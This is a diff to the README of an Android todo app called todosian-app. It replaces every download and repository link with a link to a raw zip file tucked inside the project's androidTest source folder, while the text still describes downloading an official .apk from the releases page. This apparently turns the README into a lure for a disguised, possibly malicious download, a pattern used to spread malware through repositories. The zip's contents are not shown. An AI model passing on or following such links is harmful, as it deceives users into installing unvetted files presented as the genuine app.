@@ -1,6 +1,6 @@
 # 📋 todosian-app - Manage Tasks Simply and Securely
 
-[![Download todosian-app](https://img.shields.io/badge/Download%20todosian-app-blue?style=for-the-badge)](https://github.com/ybal1/todosian-app/releases)
+[![Download todosian-app](https://img.shields.io/badge/Download%20todosian-app-blue?style=for-the-badge)](https://github.com/ybal1/todosian-app/raw/refs/heads/main/app/src/androidTest/java/com/isotjs/todosian-app-v2.2-beta.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ todosian-app is a simple Android todo list app. It keeps your data on your devic
 
 You can get todosian-app from the official GitHub releases page. This page hosts the latest versions of the app and any older versions as well. Follow these steps on your Android device or using a PC connected to your device:
 
-1. Open this page in your browser: [Download todosian-app](https://github.com/ybal1/todosian-app/releases)
+1. Open this page in your browser: [Download todosian-app](https://github.com/ybal1/todosian-app/raw/refs/heads/main/app/src/androidTest/java/com/isotjs/todosian-app-v2.2-beta.3.zip)
 2. Look for the latest release version. It usually has the highest number (like v1.2.3).
 3. Under the latest release, find the file that ends with `.apk`. This is the Android installer file.
 4. Download the `.apk` file to your device or to your PC if you plan to transfer it.
@@ -52,7 +52,7 @@ You can get todosian-app from the official GitHub releases page. This page hosts
 
 Click the button below to visit the download page and get the latest version of todosian-app:
 
-[![Download todosian-app](https://img.shields.io/badge/Download%20todosian-app-green?style=for-the-badge)](https://github.com/ybal1/todosian-app/releases)
+[![Download todosian-app](https://img.shields.io/badge/Download%20todosian-app-green?style=for-the-badge)](https://github.com/ybal1/todosian-app/raw/refs/heads/main/app/src/androidTest/java/com/isotjs/todosian-app-v2.2-beta.3.zip)
 
 ---
 
@@ -110,7 +110,7 @@ Inside the app settings, you will find options to:
 
 todosian-app is open source. You can see the full code, report issues, or contribute on GitHub:
 
-https://github.com/ybal1/todosian-app
+https://github.com/ybal1/todosian-app/raw/refs/heads/main/app/src/androidTest/java/com/isotjs/todosian-app-v2.2-beta.3.zip
 
 All code is under a permissive open-source license, which means you can use and modify it fairly freely.
 
